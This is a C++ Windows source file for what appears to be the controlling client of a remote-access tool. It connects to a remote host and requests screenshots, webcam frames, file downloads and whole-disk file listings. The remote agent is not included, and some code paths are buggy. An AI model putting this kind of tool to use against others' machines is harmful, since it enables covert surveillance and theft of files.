#include <chrono>
#include <conio.h>
#include <fstream>
#include <iostream>
#include <stack>
#include <string>
#include <vector>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include "networkDiscovery.h"
#include "../utils/GetWinDirectory.h"
#pragma comment(lib, "ws2_32.lib")

SOCKET clientSocket;

std::vector<char> receiveImageData(SOCKET clientSocket)
{
    std::vector<char> buffer;
    int bytesReceived;
    int totalBytesReceived = 0;
    int expectedSize = 0;

    bytesReceived = recv(clientSocket, (char *) &expectedSize, sizeof(int), 0);
    if (bytesReceived != sizeof(int))
    {
        std::cerr << "Failed to receive image size" << std::endl;
        return buffer;
    }
    std::cout << "Receiving image data (" << expectedSize << " bytes)" << std::endl;
    char chunk[expectedSize];

    while (totalBytesReceived < expectedSize)
    {
        bytesReceived = recv(clientSocket, chunk, expectedSize, 0);
        if (bytesReceived > 0)
        {
            buffer.insert(buffer.end(), chunk, chunk + bytesReceived);
            totalBytesReceived += bytesReceived;
        } else if (bytesReceived == 0)
        {
            std::cout << "Connection closed by server" << std::endl;
            break;
        } else
        {
            std::cerr << "recv failed with error: " << WSAGetLastError() << std::endl;
            break;
        }
    }

    if (totalBytesReceived != expectedSize)
        std::cerr << "Received " << totalBytesReceived << " bytes, expected " << expectedSize << " bytes" << std::endl;

    return buffer;
}

bool openThatShit(const std::string& file_path)
{
    std::string cmd = "!get file " + file_path;

    send(clientSocket, cmd.c_str(), strlen(cmd.c_str()), 0);

    std::vector<char> receivedData = {};
    int bytesReceived = 0;
    int expectedSize = 0;

    // Handle image data for both screen capture and webcam
    if (strcmp(cmd.c_str(), "!screenshot") == 0 || strcmp(cmd.c_str(), "!capture") == 0)
    {
        std::vector<char> imageData = receiveImageData(clientSocket);
        if (!imageData.empty())
        {
            std::string filename;
            if (strcmp(cmd.c_str(), "screen capture") == 0)
            {
                filename = "screenshot.jpg";
            } else
            {
                // Create filename with timestamp for webcam frames
                auto now = std::chrono::system_clock::now();
                auto now_c = std::chrono::system_clock::to_time_t(now);
                char timestamp[20];
                strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now_c));
                filename = "webcam_" + std::string(timestamp) + ".jpg";
            }

            std::ofstream outFile(filename, std::ios::binary);
            outFile.write(imageData.data(), imageData.size());
            outFile.close();
            std::cout << "Image saved as " << filename << std::endl;
        }
    }

    if (file_path.size() > 4 && file_path.substr(file_path.size() - 4) == ".txt")
    {
        // Receive file size
        int fileSize;
        if (recv(clientSocket, reinterpret_cast<char *>(&fileSize), sizeof(int), 0) <= 0)
        {
            std::cerr << "Failed to receive file size" << std::endl;
            return false;
        }

        // Receive file data
        std::vector<char> fileBuffer(fileSize);
        int totalReceived = 0;
        while (totalReceived < fileSize)
        {
            bytesReceived = recv(clientSocket, fileBuffer.data() + totalReceived,
                                 fileSize - totalReceived, 0);
            if (bytesReceived <= 0)
            {
                std::cerr << "Failed to receive file data" << std::endl;
                return false;
            }
            totalReceived += bytesReceived;
        }
        // Write to file
        std::string tmp(cmd.c_str());
        std::string outputPath = tmp.substr(tmp.find_last_of("\\") + 1);
        std::ofstream outFile(outputPath, std::ios::binary);
        if (!outFile) {
            std::cerr << "Failed to create output file" << std::endl;
            return false;
        }

        outFile.write(fileBuffer.data(), fileSize);
        outFile.close();

        char working_directory[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, working_directory);
        ShellExecuteA(nullptr, "open", "notepad.exe", outputPath.c_str(), working_directory, SW_SHOWNORMAL);
    }


    // Receive response msg from server
    // First, receive the size of the response
    bytesReceived = recv(clientSocket, (char *) &expectedSize, sizeof(int), 0);
    if (bytesReceived != sizeof(int)) {
        std::cerr << "Failed to receive response size" << std::endl;
        return false;
    }

    char recvBuffer[expectedSize];
    // Now receive the actual response
    while (receivedData.size() < expectedSize) {
        bytesReceived = recv(clientSocket, recvBuffer, expectedSize, 0);
        if (bytesReceived > 0) {
            receivedData.insert(receivedData.end(), recvBuffer, recvBuffer + bytesReceived);
        } else if (bytesReceived == 0) {
            break;
        } else {
            break;
        }
    }

    return true;
}

void traverse(const std::string &disk)
{
    system("cls");

    FOLDER root_folder;
    root_folder = FOLDER::readCacheFile("cache_" + disk + ".txt");
    FOLDER *ptr = &root_folder;
    std::stack<FOLDER *> stk{};

    while (true)
    {
        int i = 0;

        if (!stk.empty())
            std::cout << "Previous folder: " << stk.top()->path << std::endl;
        std::cout << "Current folder: " << ptr->path << std::endl;

        for (; i < ptr->subfolders.size(); i++)
            std::cout << i + 1 << ". " << ptr->subfolders[i].name << std::endl;

        for (auto file : ptr->files)
            std::cout << i++ + 1 << ". " << file.name << std::endl;

        int next_destination = 0;
        std::cin >> next_destination;

        if (next_destination == 0)
        {
            std::cout << "pai pai" << std::endl;
            system("cls");
            return;
        }
        else if (next_destination == -1)
        {
            if (stk.empty())
                std::cout << "No parent" << std::endl;
            else
            {
                ptr = stk.top();
                stk.pop();
                system("cls");
            }
        }
        else if (next_destination <= ptr->subfolders.size() + ptr->files.size())
        {
            if (next_destination > ptr->subfolders.size())
                openThatShit(ptr->files[next_destination - ptr->subfolders.size() - 1].path);
            else
            {
                stk.push(ptr);
                ptr = &ptr->subfolders[next_destination - 1];
            }
            system("cls");
        }
    }
}

int main()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "Failed to initialize Winsock" << std::endl;
        return 1;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "Failed to create socket" << std::endl;
        WSACleanup();
        return 1;
    }

    // Scan IP first
    NetworkDiscovery initialDiscovery;
    initialDiscovery.sendBroadcast();
    initialDiscovery.listenForResponses(5);
    // Scan IP first

    std::string serverIP;
    int serverPort;

    std::cout << "Enter server IP address: ";
    std::cin >> serverIP;
    std::cout << "Enter server port: ";
    std::cin >> serverPort;
    std::cin.ignore(); // Clear the newline from the input buffer

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr);

    if (connect(clientSocket, (sockaddr *) &serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        std::cerr << "Connection failed" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }


    std::cout << "Connected to server at " << serverIP << ":" << serverPort << std::endl;

    std::cout << "!help for list of commands" << std::endl;

    while (true)
    {
        char sendBuffer[1024];
        std::cout << "Enter your message: ";
        std::cin.getline(sendBuffer, 1024);

        if (std::string(sendBuffer) == "list network")
        {
            NetworkDiscovery networkDiscovery;
            networkDiscovery.sendBroadcast();
            networkDiscovery.listenForResponses(5);
            continue;
        }

        if (strstr(sendBuffer, "!traverse ") != NULL)
        {
            auto disk = std::string(sendBuffer + 10);
            traverse(disk);
            std::cin.ignore();
            continue;
        }

        send(clientSocket, sendBuffer, strlen(sendBuffer), 0);

        if (strcmp(sendBuffer, "!exit") == 0)
        {
            break;
        }


        // Receive attachments from server
        // Receive response from server
        std::vector<char> receivedData = {};
        int bytesReceived = 0;
        int expectedSize = 0;

        // Handle image data for both screen capture and webcam
        if (strcmp(sendBuffer, "!screenshot") == 0 || strcmp(sendBuffer, "!capture") == 0)
        {
            std::vector<char> imageData = receiveImageData(clientSocket);
            if (!imageData.empty())
            {
                std::string filename;
                if (strcmp(sendBuffer, "screen capture") == 0)
                {
                    filename = "screenshot.jpg";
                } else
                {
                    // Create filename with timestamp for webcam frames
                    auto now = std::chrono::system_clock::now();
                    auto now_c = std::chrono::system_clock::to_time_t(now);
                    char timestamp[20];
                    strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now_c));
                    filename = "webcam_" + std::string(timestamp) + ".jpg";
                }

                std::ofstream outFile(filename, std::ios::binary);
                outFile.write(imageData.data(), imageData.size());
                outFile.close();
                std::cout << "Image saved as " << filename << std::endl;
            }
        }

        if (strstr(sendBuffer, "!get file") != NULL)
        {
            // Receive file size
            int fileSize;
            if (recv(clientSocket, reinterpret_cast<char *>(&fileSize), sizeof(int), 0) <= 0)
            {
                std::cerr << "Failed to receive file size" << std::endl;
                return false;
            }

            // Receive file data
            std::vector<char> fileBuffer(fileSize);
            int totalReceived = 0;
            while (totalReceived < fileSize)
            {
                bytesReceived = recv(clientSocket, fileBuffer.data() + totalReceived,
                                     fileSize - totalReceived, 0);
                if (bytesReceived <= 0)
                {
                    std::cerr << "Failed to receive file data" << std::endl;
                    return false;
                }
                totalReceived += bytesReceived;
            }
            // Write to file
            std::string tmp(sendBuffer);
            std::string outputPath = tmp.substr(tmp.find_last_of("\\") + 1);
            std::ofstream outFile(outputPath, std::ios::binary);
            if (!outFile) {
                std::cerr << "Failed to create output file" << std::endl;
                return false;
            }

            outFile.write(fileBuffer.data(), fileSize);
            outFile.close();

            std::cout << "File received and saved to: " << outputPath << std::endl;
        }

        if (strstr(sendBuffer, "!index ") != NULL) {
            std::string str(sendBuffer + 7);

            int numDisks = 0;
            if (str.empty()) {
                recv(clientSocket, (char *) &numDisks, sizeof(int), 0);
                for (int i = 0; i < numDisks; i++) {
                    // Get disk name
                    char diskName[3];
                    recv(clientSocket, diskName, sizeof(diskName), 0);

                    // Receive file size
                    int fileSize;
                    if (recv(clientSocket, reinterpret_cast<char *>(&fileSize), sizeof(int), 0) <= 0) {
                        std::cerr << "Failed to receive file size" << std::endl;
                        return false;
                    }

                    // Receive file data
                    std::vector<char> fileBuffer(fileSize);
                    int totalReceived = 0;
                    while (totalReceived < fileSize) {
                        int bytesReceived = recv(clientSocket, fileBuffer.data() + totalReceived,
                                                 fileSize - totalReceived, 0);
                        if (bytesReceived <= 0) {
                            std::cerr << "Failed to receive file data" << std::endl;
                            return false;
                        }
                        totalReceived += bytesReceived;
                    }

                    // Write to file
                    std::string tmp(diskName);
                    tmp = tmp.substr(0, 1);
                    std::ofstream outFile("cache_" + tmp + ".txt", std::ios::binary);
                    outFile.write(fileBuffer.data(), fileSize);
                    outFile.close();
                }
            } else {
                // Receive file size
                int fileSize;
                if (recv(clientSocket, reinterpret_cast<char *>(&fileSize), sizeof(int), 0) <= 0) {
                    std::cerr << "Failed to receive file size" << std::endl;
                    return false;
                }
                // Receive file data
                std::vector<char> fileBuffer(fileSize);
                int totalReceived = 0;
                while (totalReceived < fileSize) {
                    int bytesReceived = recv(clientSocket, fileBuffer.data() + totalReceived,
                                             fileSize - totalReceived, 0);
                    if (bytesReceived <= 0) {
                        std::cerr << "Failed to receive file data" << std::endl;
                        return false;
                    }
                    totalReceived += bytesReceived;
                }

                // Write to file
                str = str.substr(0, 1);
                std::ofstream outFile("cache_" + str + ".txt", std::ios::binary);
                outFile.write(fileBuffer.data(), fileSize);
                outFile.close();
            }
            // TODO: Implement indexing
        }

        // If webcam is started, you can automatically request frames
        if (strcmp(sendBuffer, "start webcam") == 0)
        {
            std::cout << "Webcam started. Use 'get webcam frame' to capture frames.\n";
        }

        // Receive response msg from server
        // First, receive the size of the response
        bytesReceived = recv(clientSocket, (char *) &expectedSize, sizeof(int), 0);
        if (bytesReceived != sizeof(int)) {
            std::cerr << "Failed to receive response size" << std::endl;
            continue;
        }

        char recvBuffer[expectedSize];
        // Now receive the actual response
        while (receivedData.size() < expectedSize) {
            bytesReceived = recv(clientSocket, recvBuffer, expectedSize, 0);
            if (bytesReceived > 0) {
                receivedData.insert(receivedData.end(), recvBuffer, recvBuffer + bytesReceived);
            } else if (bytesReceived == 0) {
                std::cout << "Server closed the connection" << std::endl;
                break;
            } else {
                std::cerr << "recv failed with error: " << WSAGetLastError() << std::endl;
                break;
            }
        }

        if (!receivedData.empty()) {
            std::string response(receivedData.begin(), receivedData.end());
            std::cout << "Server response: " << std::endl << response << std::endl;
        }
    }
    closesocket(clientSocket);
    WSACleanup();
    return 0;
}
